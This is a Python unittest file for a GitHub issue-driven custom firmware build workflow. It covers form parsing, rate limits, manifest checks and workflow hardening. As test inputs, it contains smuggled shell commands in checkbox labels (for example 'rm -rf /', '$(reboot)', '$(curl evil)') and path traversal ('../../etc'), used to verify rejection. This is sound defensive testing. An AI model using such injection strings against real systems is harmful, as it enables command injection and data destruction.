"""Tests for tools/build_request.py, the build request issue form and custom-build.yml.
Run: python -I tools/test_build_request.py"""
import contextlib
import io
import json
import os
import re
import shutil
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, HERE)

import build_request  # noqa: E402
import buildopts  # noqa: E402

FEATURES, PRESETS = buildopts.load(ROOT)
NOW = "2026-11-13T12:00:00Z"
INDEX = {"latest": "v0.60", "previous": "v0.59", "releases": ["v0.60", "v0.59"]}
CYD = build_request.TARGETS["cyd"]
BARE = build_request.TARGETS["esp32"]


def body(off=(), board=CYD, crlf=False, extra_off=(), extra_board=()):
    """An issue body the way GitHub renders the build request form."""
    lines = ["### " + build_request.OFF_HEADING, ""]
    for f in FEATURES:
        if f.get("reserved"):
            continue
        lines.append("- [%s] %s" % ("X" if f["id"] in off else " ", build_request.box_label(f)))
    lines += list(extra_off)
    lines += ["", "### " + build_request.BOARD_HEADING, "", board]
    lines += list(extra_board)
    text = "\n".join(lines)
    return text.replace("\n", "\r\n") if crlf else text


def issue(number, login="caller", created="2026-11-13T11:00:00Z", pr=False):
    d = {"number": number, "user": {"login": login}, "created_at": created}
    if pr:
        d["pull_request"] = {}
    return d


def event(text, number=10, login="caller", created="2026-11-13T11:59:00Z"):
    return {"issue": {"number": number, "body": text, "user": {"login": login}, "created_at": created}}


class ParseTest(unittest.TestCase):
    def test_the_forms_lines_parse(self):
        off, target = build_request.parse(body(off={"lord", "web"}, board=BARE))
        self.assertEqual(off, {"lord", "web"})
        self.assertEqual(target, "esp32")

    def test_nothing_ticked_is_everything_on_a_cyd(self):
        self.assertEqual(build_request.parse(body()), (set(), "cyd"))

    def test_windows_line_endings_and_lower_case_x(self):
        text = body(off={"nets"}, crlf=True).replace("[X]", "[x]")
        self.assertEqual(build_request.parse(text), ({"nets"}, "cyd"))

    def test_unknown_checkbox_is_refused(self):
        with self.assertRaises(ValueError):
            build_request.parse(body(extra_off=["- [X] GPIO (gpio)"]))
        with self.assertRaises(ValueError):
            build_request.parse(body(extra_off=["- [X] Turbo (turbo)"]))

    def test_switch_names_with_shell_text_are_refused(self):
        for bad in ("- [X] LORD (lord;rm -rf /)", "- [X] LORD (lord)$(reboot)", "- [X] LORD (lord) ; ls",
                    "- [X] LORD (lord)`id`"):
            with self.subTest(line=bad), self.assertRaises(ValueError) as cm:
                build_request.parse(body(extra_off=[bad]))
            self.assertNotIn("rm -rf", str(cm.exception))
            self.assertNotIn("reboot", str(cm.exception))
            self.assertNotIn("$(", str(cm.exception))

    def test_free_text_is_refused_and_never_echoed(self):
        for where in ("off", "board", "top"):
            text = body(extra_off=["please also add AXIS_OFF=$(curl evil)"] if where == "off" else (),
                        extra_board=["$(curl evil)"] if where == "board" else ())
            if where == "top":
                text = "hello $(curl evil)\n" + text
            with self.subTest(where=where), self.assertRaises(ValueError) as cm:
                build_request.parse(text)
            self.assertNotIn("curl", str(cm.exception))

    def test_unknown_heading_board_or_repeat_is_refused(self):
        for text in (body() + "\n\n### Notes\n\nhi",
                     body(board="Heltec V3"),
                     body(extra_board=[BARE]),
                     body(extra_off=["- [X] " + build_request.box_label(FEATURES[0])] * 2),
                     body().replace("### " + build_request.BOARD_HEADING, "### Something else"),
                     body().split("\n### " + build_request.BOARD_HEADING)[0],
                     "", None):
            with self.subTest(text=text), self.assertRaises(ValueError):
                build_request.parse(text)


class FormTest(unittest.TestCase):
    def setUp(self):
        try:
            import yaml
        except ImportError:
            self.skipTest("PyYAML is not installed")
        with open(os.path.join(ROOT, ".github", "ISSUE_TEMPLATE", "build-request.yml"), encoding="utf-8") as fh:
            self.text = fh.read()
        self.form = yaml.safe_load(self.text)

    def test_one_box_per_selectable_feature_and_the_two_boards(self):
        elems = {e.get("id"): e for e in self.form["body"]}
        self.assertEqual(self.form["labels"], [build_request.LABEL])
        boxes = elems["leave-out"]
        self.assertEqual(boxes["type"], "checkboxes")
        self.assertEqual(boxes["attributes"]["label"], build_request.OFF_HEADING)
        want = [build_request.box_label(f) for f in FEATURES if not f.get("reserved")]
        self.assertEqual([o["label"] for o in boxes["attributes"]["options"]], want)
        self.assertNotIn("gpio", self.text)
        board = elems["board"]
        self.assertEqual(board["type"], "dropdown")
        self.assertEqual(board["attributes"]["label"], build_request.BOARD_HEADING)
        self.assertEqual(board["attributes"]["options"], [CYD, BARE])
        self.assertTrue(board["validations"]["required"])

    def test_no_free_text_fields(self):
        self.assertEqual({e["type"] for e in self.form["body"]}, {"markdown", "checkboxes", "dropdown"})
        self.assertNotIn("—", self.text)
        self.assertNotIn("--", self.text)


class RateTest(unittest.TestCase):
    def test_three_a_day_then_refused(self):
        self.assertTrue(build_request.rate_ok("caller", [issue(1), issue(2), issue(3)]))
        self.assertFalse(build_request.rate_ok("caller", [issue(1), issue(2), issue(3), issue(4)]))

    def test_other_users_and_pull_requests_do_not_count(self):
        reqs = [issue(1), issue(2), issue(3), issue(4, login="someone"), issue(5, pr=True)]
        self.assertTrue(build_request.rate_ok("caller", reqs))
        self.assertTrue(build_request.rate_ok("CALLER", reqs[:3]))

    def test_recent_keeps_the_last_24_hours_up_to_this_issue(self):
        reqs = [issue(1, created="2026-11-12T11:59:59Z"), issue(2, created="2026-11-12T12:00:01Z"),
                issue(3), issue(11)]
        got = build_request.recent(reqs, now=NOW, upto=10)
        self.assertEqual([r["number"] for r in got], [2, 3])

    def test_issues_query_uses_the_label_creator_and_a_day(self):
        seen = []

        def api(path):
            seen.append(path)
            return [issue(9)]
        got = build_request.fetch_requests(api, "revjmoney/axis-bbs", "some user", now=NOW)
        self.assertEqual(got, [issue(9)])
        self.assertEqual(len(seen), 1)
        self.assertTrue(seen[0].startswith("/repos/revjmoney/axis-bbs/issues?"), seen[0])
        for part in ("creator=some+user", "labels=build-request", "state=all", "since=2026-11-12T12%3A00%3A00Z"):
            self.assertIn(part, seen[0])


class DecideTest(unittest.TestCase):
    def decide(self, text, builds=(), requests=None, index=INDEX, **kw):
        calls = []

        def fetch(user):
            self.assertEqual(user, "caller")
            calls.append(1)
            return requests if requests is not None else []
        got = build_request.decide(event(text, **kw), index, list(builds), fetch, now=NOW,
                                   features=FEATURES, presets=PRESETS)
        got["_api_calls"] = len(calls)
        return got

    def test_a_new_selection_builds_with_the_buildopts_fingerprint(self):
        got = self.decide(body(off={"lord", "cluster"}))
        self.assertEqual(got["status"], "build")
        self.assertEqual(got["off"], "cluster,lord")
        self.assertEqual(got["release"], "v0.60")
        self.assertEqual(got["target"], "cyd")
        self.assertEqual(got["fingerprint"], buildopts.fingerprint({"lord", "cluster"}, "v0.60"))
        self.assertRegex(got["fingerprint"], r"^[0-9a-f]{12}$")

    def test_a_dependency_break_is_refused_with_its_reason(self):
        got = self.decide(body(off={"files"}))
        self.assertEqual(got["status"], "refused")
        self.assertIn("ansiview needs files", got["reason"])
        self.assertIn("transfers needs files", got["reason"])
        self.assertEqual(got["_api_calls"], 0)

    def test_a_bad_body_is_refused_without_echo(self):
        got = self.decide(body(extra_off=["- [X] LORD (lord;reboot)"]))
        self.assertEqual(got["status"], "refused")
        self.assertNotIn("reboot", got["reason"])

    def test_an_existing_build_short_circuits_before_the_rate_check(self):
        fp = buildopts.fingerprint({"web"}, "v0.60")
        got = self.decide(body(off={"web"}), builds=["builds/%s/manifest.json" % fp, "builds/%s/firmware.bin" % fp],
                          requests=[issue(n) for n in range(1, 9)])
        self.assertEqual(got["status"], "exists")
        self.assertEqual(got["fingerprint"], fp)
        self.assertEqual(got["_api_calls"], 0)

    def test_a_build_folder_without_its_manifest_builds_again(self):
        fp = buildopts.fingerprint({"web"}, "v0.60")
        got = self.decide(body(off={"web"}), builds=["builds/%s/firmware.bin" % fp])
        self.assertEqual(got["status"], "build")

    def test_a_preset_selection_points_at_the_installer(self):
        got = self.decide(body(off={"modemlink"}))
        self.assertEqual(got["status"], "preset")
        self.assertIn("No radio link", got["reason"])
        self.assertEqual(self.decide(body())["status"], "preset")

    def test_the_fourth_request_in_a_day_is_refused(self):
        three = [issue(7), issue(8), issue(10)]
        self.assertEqual(self.decide(body(off={"lord"}), requests=three)["status"], "build")
        got = self.decide(body(off={"lord"}), requests=[issue(6)] + three)
        self.assertEqual(got["status"], "refused")
        self.assertIn("3", got["reason"])
        self.assertEqual(got["_api_calls"], 1)

    def test_later_issues_do_not_count_against_an_earlier_one(self):
        reqs = [issue(10), issue(11), issue(12), issue(13)]
        self.assertEqual(self.decide(body(off={"lord"}), requests=reqs)["status"], "build")

    def test_no_release_on_the_site_is_refused(self):
        for idx in (None, {"latest": None, "previous": None, "releases": []},
                    {"latest": "v0.60;ls", "releases": ["v0.60;ls"]}, {"latest": "v0.61", "releases": ["v0.60"]}):
            with self.subTest(index=idx):
                self.assertEqual(self.decide(body(off={"lord"}), index=idx)["status"], "refused")

    def test_outputs_hold_only_safe_text(self):
        got = self.decide(body(off={"lord"}), requests=[issue(n) for n in range(5, 11)])
        for k, v in got.items():
            if k.startswith("_"):
                continue
            self.assertRegex(v, r"^[A-Za-z0-9 ,.:;()_-]*$", k)


class CheckCliTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.tmp)

    def path(self, name, data):
        p = os.path.join(self.tmp, name)
        with open(p, "w", encoding="utf-8") as fh:
            fh.write(data if isinstance(data, str) else json.dumps(data))
        return p

    def test_check_writes_github_outputs(self):
        out = self.path("out.txt", "")
        ev = self.path("event.json", event(body(off={"lord", "dosprompt"})))
        idx = self.path("index.json", INDEX)
        builds = self.path("builds.txt", "")
        with contextlib.redirect_stdout(io.StringIO()):
            rc = build_request.main(["check", "--event", ev, "--index", idx, "--builds", builds, "--out", out,
                                     "--repo", "revjmoney/axis-bbs"], api=lambda path: [], now=NOW)
        self.assertEqual(rc, 0)
        with open(out, encoding="utf-8") as fh:
            lines = dict(line.split("=", 1) for line in fh.read().splitlines())
        self.assertEqual(lines["status"], "build")
        self.assertEqual(lines["off"], "dosprompt,lord")
        self.assertEqual(lines["fingerprint"], buildopts.fingerprint({"lord", "dosprompt"}, "v0.60"))

    def test_a_missing_index_file_is_a_refusal(self):
        out = self.path("out.txt", "")
        ev = self.path("event.json", event(body(off={"lord"})))
        builds = self.path("builds.txt", "")
        with contextlib.redirect_stdout(io.StringIO()):
            rc = build_request.main(["check", "--event", ev, "--index", os.path.join(self.tmp, "none.json"),
                                     "--builds", builds, "--out", out, "--repo", "a/b"], api=lambda p: [], now=NOW)
        self.assertEqual(rc, 0)
        with open(out, encoding="utf-8") as fh:
            self.assertIn("status=refused", fh.read())


def fake_build(d, app=1000):
    os.makedirs(d, exist_ok=True)
    for name, size in (("bootloader.bin", 100), ("partitions.bin", 50), ("ota_data_initial.bin", 20),
                       ("firmware.bin", app)):
        with open(os.path.join(d, name), "wb") as fh:
            fh.write(b"\1" * size)
    with open(os.path.join(d, "axis-bbs.map"), "w", encoding="utf-8") as fh:
        fh.write(".dram0.data     0x3ffb0000      0x10\n.dram0.bss      0x3ffb0010      0x20\n")


class ManifestPublishTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.tmp)
        self.build = os.path.join(self.tmp, "build")
        fake_build(self.build)
        self.art = os.path.join(self.tmp, "art")
        self.gh = os.path.join(self.tmp, "gh")
        os.makedirs(self.gh)
        self.fp = buildopts.fingerprint({"lord", "web"}, "v0.60")

    def make(self):
        return build_request.custom_manifest(self.build, self.art, {"web", "lord"}, "v0.60", self.fp,
                                             size_tool="", now="2026-11-13T12:00:00Z")

    def test_manifest_has_built_time_and_the_fingerprint(self):
        m = self.make()
        self.assertEqual(m["built"], "2026-11-13T12:00:00Z")
        self.assertEqual(m["fingerprint"], self.fp)
        self.assertEqual(m["off"], ["lord", "web"])
        self.assertEqual(m["preset"], "custom")
        with open(os.path.join(self.art, "manifest.json"), encoding="utf-8") as fh:
            self.assertEqual(json.load(fh)["built"], "2026-11-13T12:00:00Z")

    def test_a_wrong_fingerprint_is_refused(self):
        with self.assertRaises(ValueError):
            build_request.custom_manifest(self.build, self.art, {"web"}, "v0.60", self.fp, size_tool="")

    def test_publish_copies_into_builds_and_prunes(self):
        self.make()
        old = os.path.join(self.gh, "builds", "0123456789ab")
        os.makedirs(old)
        with open(os.path.join(old, "firmware.bin"), "wb") as fh:
            fh.write(b"\0" * 2000)
        build_request.publish(self.art, self.gh, self.fp, builds_cap=2500)
        names = sorted(os.listdir(os.path.join(self.gh, "builds")))
        self.assertEqual(names, [self.fp])
        self.assertEqual(sorted(os.listdir(os.path.join(self.gh, "builds", self.fp))),
                         ["bootloader.bin", "firmware.bin", "manifest.json", "ota_data_initial.bin",
                          "partitions.bin"])
        self.assertTrue(os.path.isfile(os.path.join(self.gh, "releases", "index.json")))
        build_request.publish(self.art, self.gh, self.fp, builds_cap=2500)  # a retry on a fresh tree is the same
        self.assertEqual(sorted(os.listdir(os.path.join(self.gh, "builds"))), [self.fp])

    def test_publish_refuses_anything_off_the_manifest(self):
        cases = {
            "extra file": lambda: self._append("run.sh"),
            "changed image": lambda: self._append("firmware.bin"),
            "fingerprint": lambda: self._edit(lambda m: m.update(fingerprint="0" * 12)),
            "off list": lambda: self._edit(lambda m: m.update(off=["lord"])),
            "too big": lambda: self._edit(lambda m: m["app_partition"].update(size=10)),
            "bad file name": lambda: self._edit(lambda m: m["images"][0].update(file="../x.bin")),
        }
        for what, spoil in cases.items():
            with self.subTest(what=what):
                shutil.rmtree(self.art, ignore_errors=True)
                self.make()
                spoil()
                with self.assertRaises(ValueError):
                    build_request.publish(self.art, self.gh, self.fp)
                self.assertFalse(os.path.isdir(os.path.join(self.gh, "builds", self.fp)))
        with self.assertRaises(ValueError):
            build_request.publish(self.art, self.gh, "../../etc")

    def _append(self, name):
        with open(os.path.join(self.art, name), "ab") as fh:
            fh.write(b"x")

    def _edit(self, change):
        p = os.path.join(self.art, "manifest.json")
        with open(p, encoding="utf-8") as fh:
            m = json.load(fh)
        change(m)
        with open(p, "w", encoding="utf-8") as fh:
            json.dump(m, fh)


class AnswerTest(unittest.TestCase):
    def answer(self, **kw):
        args = dict(parse_result="success", status="build", reason="", fingerprint="abcdef012345",
                    target="cyd", release="v0.60", off="lord", build_result="success",
                    publish_result="success", repo="revjmoney/axis-bbs", run_url="https://example.invalid/run/1")
        args.update(kw)
        return build_request.answer(**args)

    def test_a_published_build_gets_the_link_and_closes(self):
        text, close = self.answer()
        self.assertTrue(close)
        self.assertIn("https://revjmoney.github.io/axis-bbs/install.html?build=abcdef012345", text)
        self.assertIn("CYD", text)
        self.assertIn("v0.60", text)
        self.assertIn("AXIS Micro BBS", text)

    def test_an_existing_build_gets_the_link_and_closes(self):
        text, close = self.answer(status="exists", build_result="skipped", publish_result="skipped",
                                  target="esp32")
        self.assertTrue(close)
        self.assertIn("install.html?build=abcdef012345", text)
        self.assertIn("headless", text)

    def test_a_refusal_stays_open_with_its_reason(self):
        text, close = self.answer(status="refused", reason="ansiview needs files, which is off",
                                  build_result="skipped", publish_result="skipped")
        self.assertFalse(close)
        self.assertIn("ansiview needs files", text)

    def test_a_failed_build_or_parse_stays_open_with_the_run(self):
        for kw in (dict(build_result="failure", publish_result="skipped"), dict(publish_result="failure"),
                   dict(parse_result="failure", status="")):
            with self.subTest(**kw):
                text, close = self.answer(**kw)
                self.assertFalse(close)
                self.assertIn("https://example.invalid/run/1", text)
                self.assertNotIn("install.html?build=", text)

    def test_no_em_dashes_or_double_hyphens(self):
        for kw in (dict(), dict(status="exists"), dict(status="preset", reason="That is the No radio link preset."),
                   dict(status="refused", reason="x"), dict(build_result="failure")):
            text, _ = self.answer(**kw)
            self.assertNotIn("—", text)
            self.assertNotIn("--", text)


class WorkflowTest(unittest.TestCase):
    def setUp(self):
        try:
            import yaml
        except ImportError:
            self.skipTest("PyYAML is not installed")
        with open(os.path.join(ROOT, ".github", "workflows", "custom-build.yml"), encoding="utf-8") as fh:
            self.text = fh.read()
        self.doc = yaml.safe_load(self.text)
        self.jobs = self.doc["jobs"]

    def steps(self):
        for jid, job in self.jobs.items():
            for step in job.get("steps", []):
                yield jid, step

    def test_pins_tabs_and_dashes(self):
        uses = re.findall(r"^\s*(?:-\s+)?uses:\s*(\S+)", self.text, re.M)
        self.assertTrue(uses)
        for u in uses:
            self.assertRegex(u, r"^[\w.-]+/[\w./-]+@[0-9a-f]{40}$")
        self.assertNotIn("\t", self.text)
        self.assertNotIn("—", self.text)

    def test_trigger_and_gate(self):
        self.assertEqual(self.doc[True]["issues"]["types"], ["opened", "edited"])
        gate = self.jobs["parse"]["if"]
        for needle in ("build-request", "'open'", "opened", "github.event.changes.body"):
            self.assertIn(needle, gate)

    def test_only_a_changed_request_cancels_a_running_build(self):
        group = self.doc["concurrency"]["group"]
        self.assertIn("github.event.issue.number", group)
        self.assertIn("github.event.changes.body", group)
        self.assertIn("github.run_id", group)
        self.assertTrue(self.doc["concurrency"]["cancel-in-progress"])

    def test_permissions_per_job(self):
        self.assertEqual(self.doc["permissions"], {"contents": "read"})
        self.assertEqual(set(self.jobs), {"parse", "build", "publish", "answer"})
        self.assertEqual(self.jobs["parse"]["permissions"], {"contents": "read", "issues": "read"})
        self.assertEqual(self.jobs["build"]["permissions"], {"contents": "read"})
        self.assertEqual(self.jobs["publish"]["permissions"], {"contents": "write"})
        self.assertEqual(self.jobs["answer"]["permissions"], {"contents": "read", "issues": "write"})
        for jid, job in self.jobs.items():
            self.assertIn("runs-on", job, jid)
            self.assertIn("timeout-minutes", job, jid)

    def test_untrusted_text_never_reaches_a_run_line(self):
        for needle in ("github.event.issue.body", "github.event.issue.title", "github.event.issue.user",
                       "github.head_ref", "github.event.comment"):
            self.assertNotIn(needle, self.text)
        for jid, step in self.steps():
            if "run" in step:
                with self.subTest(job=jid, step=step.get("name")):
                    self.assertNotIn("${{", step["run"])

    def test_no_checkout_of_untrusted_refs(self):
        for jid, step in self.steps():
            if "actions/checkout" in step.get("uses", ""):
                ref = str(step.get("with", {}).get("ref", ""))
                self.assertIn(ref, ("", "gh-pages", "refs/tags/${{ needs.parse.outputs.release }}"), (jid, ref))
        self.assertIn("needs.parse.outputs.release", str(self.jobs["build"]["steps"]))

    def test_the_jobs_do_their_parts(self):
        parse = str(self.jobs["parse"]["steps"])
        self.assertIn("tools/build_request.py check", parse)
        self.assertIn("GITHUB_EVENT_PATH", parse)
        build = self.jobs["build"]
        self.assertEqual(build["needs"], "parse")
        self.assertIn("status == 'build'", build["if"])
        self.assertIn("needs.parse.outputs.off", str(build.get("env", {})))
        bs = str(build["steps"])
        for needle in ("AXIS_OFF", "pio run -e cyd", "tools/pio_features.py", "build_request.py manifest"):
            self.assertIn(needle, bs + str(build.get("env", {})))
        pub = self.jobs["publish"]
        self.assertEqual(set(pub["needs"]), {"parse", "build"})
        ps = str(pub["steps"])
        self.assertIn("ghpages_publish.sh", ps)
        self.assertIn("build_request.py publish", ps)
        self.assertNotIn("--allow-prune", ps)
        self.assertNotIn("pio ", ps)
        ans = self.jobs["answer"]
        self.assertEqual(set(ans["needs"]), {"parse", "build", "publish"})
        self.assertIn("!cancelled()", ans["if"])
        a = str(ans["steps"])
        for needle in ("build_request.py answer", "gh issue comment", "--body-file", "gh issue close"):
            self.assertIn(needle, a)


if __name__ == "__main__":
    unittest.main()
